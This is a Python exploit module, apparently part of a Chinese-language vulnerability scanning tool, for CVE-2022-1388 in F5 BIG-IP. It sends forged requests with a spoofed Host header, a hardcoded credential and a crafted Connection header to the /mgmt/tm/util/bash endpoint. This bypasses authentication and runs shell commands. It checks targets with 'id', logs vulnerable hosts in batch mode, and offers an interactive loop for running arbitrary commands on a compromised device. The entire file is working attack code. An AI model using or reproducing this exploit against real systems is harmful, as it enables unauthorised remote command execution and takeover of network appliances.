#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoErr,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Cve_2022_1388:

    def exploit(self,target, command):
        url = f'{target}/mgmt/tm/util/bash'
        headers = {
            'Host': '127.0.0.1',
            'User-Agent': self.header,
            'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
            'X-F5-Auth-Token': 'asdf',
            'Connection': 'X-F5-Auth-Token',
            'Content-Type': 'application/json'

        }
        j = {"command": "run", "utilCmdArgs": "-c '{0}'".format(command)}
        try:
            r = requests.post(url, headers=headers, json=j, verify=self.ssl,proxies=self.proxy)
            r.raise_for_status()
            if (r.status_code != 204 and r.headers["content-type"].strip().startswith("application/json")):
                OutPrintInfoSuc("BigIP",f"目标存在漏洞{url}")
                if not self.batch:
                    OutPrintInfo("BigIP",f"输出结果: \n{r.json()['commandResult'].strip()}")
                else:
                    OutPutFile("bigip_2022_1388.txt",f"目标存在漏洞{url}")
                return True
                # print(url)
            else:
                if not self.batch:
                    OutPrintInfo("BigIP","目标不存在漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("BigIP","目标请求异常")
            return False
    def exploit2(self,target, command):
        url = f'{target}/mgmt/tm/util/bash'
        headers = {
            'Host': '127.0.0.1',
            'User-Agent': self.header,
            'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
            'X-F5-Auth-Token': 'asdf',
            'Connection': 'X-F5-Auth-Token',
            'Content-Type': 'application/json'

        }
        j = {"command": "run", "utilCmdArgs": "-c '{0}'".format(command)}
        try:
            r = requests.post(url, headers=headers, json=j, verify=self.ssl,proxies=self.proxy)
            r.raise_for_status()
            if (r.status_code != 204 and r.headers["content-type"].strip().startswith("application/json")):
                # OutPrintInfoSuc("BigIP","目标存在漏洞")
                # OutPrintInfo("BigIP","输出结果:")
                print(r.json()['commandResult'].strip())
                # print(url)
            else:
                OutPrintInfo("BigIP","目标不存在漏洞")
        except Exception:
            OutPrintInfo("BigIP","目标请求异常")
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.header = target["header"]

        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        cmd = "id"
        if self.exploit(url, cmd):
            if not self.batch:
                choose = Prompt.ask("[b bright_yellow]是否进行漏洞利用([b bright_red]y/n[/b bright_red])")
                if choose == "y":
                    while True:
                        cmd = Prompt.ask("[b bright_yellow]输入执行命令")
                        if cmd == "exit":
                            break
                        self.exploit2(url, cmd)






